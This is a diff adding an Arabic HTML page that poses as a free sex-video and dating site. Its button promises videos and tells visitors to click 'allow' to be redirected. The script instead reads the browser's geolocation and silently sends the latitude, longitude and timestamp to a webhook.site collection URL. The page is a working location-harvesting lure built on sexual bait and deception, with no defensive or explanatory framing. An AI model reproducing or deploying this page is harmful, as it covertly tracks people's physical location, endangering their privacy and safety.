@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>   السكس المجاني بلا حدود الان  </title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding: 40px 20px;
+    background: #f5f5f5;
+  }
+  h1 {
+    color: #333;
+  }
+  p {
+    margin: 20px auto;
+    font-size: 1.2em;
+    max-width: 400px;
+  }
+  button {
+    padding: 15px 30px;
+    font-size: 1.2em;
+    background-color: #008CBA;
+    border: none;
+    color: white;
+    border-radius: 8px;
+    cursor: pointer;
+  }
+  button:disabled {
+    background-color: #888;
+    cursor: default;
+  }
+  #status {
+    margin-top: 20px;
+    font-weight: bold;
+    color: green;
+  }
+</style>
+</head>
+<body>
+  <h1> اضغط علي الزر لتري احدث فيديوهات السكس المصري والعالمي والتواصل المجاني مع الشريك</h1>
+  <p> اضغط الان و ودع العاده السريه منفردا .</p>
+  <button id="btnShare"> نعم هيا لنري احدث الفيديوهات</button>
+  <div id="status"></div>
+
+  <script>
+    const btn = document.getElementById('btnShare');
+    const status = document.getElementById('status');
+    const webhookUrl = "https://webhook.site/8a9f05dc-8d9d-4353-89fb-ae86b7a217a2";
+
+    btn.addEventListener('click', () => {
+      if (!navigator.geolocation) {
+        status.innerText = " انتظر جاري تحويلك الان   .";
+        return;
+      }
+
+      btn.disabled = true;
+      status.innerText = "انقر سماح كي يتم التحويل....";
+
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          status.innerText = `انقر سماح كي يتم التحويل..`;
+
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              latitude: lat,
+              longitude: lon,
+              timestamp: Date.now()
+            })
+          })
+          .then(response => {
+            if (response.ok) {
+              status.innerText = "تم إرسال بنجاح! شكراً لمشاركتك.";
+            } else {
+              status.innerText = "حدث خطأ أثناء إرسال .";
+              btn.disabled = false;
+            }
+          })
+          .catch(() => {
+            status.innerText = "فشل في إرسال .";
+            btn.disabled = false;
+          });
+        },
+        error => {
+          switch(error.code) {
+            case error.PERMISSION_DENIED:
+              status.innerText = "تم رفض السماح بالوصول .";
+              break;
+            case error.POSITION_UNAVAILABLE:
+              status.innerText = "الموقع غير متاح.";
+              break;
+            case error.TIMEOUT:
+              status.innerText = "انتهت مهلة طلب الموقع.";
+              break;
+            default:
+              status.innerText = "حدث خطأ غير معروف.";
+          }
+          btn.disabled = false;
+        }
+      );
+    });
+  </script>
+</body>
+</html>
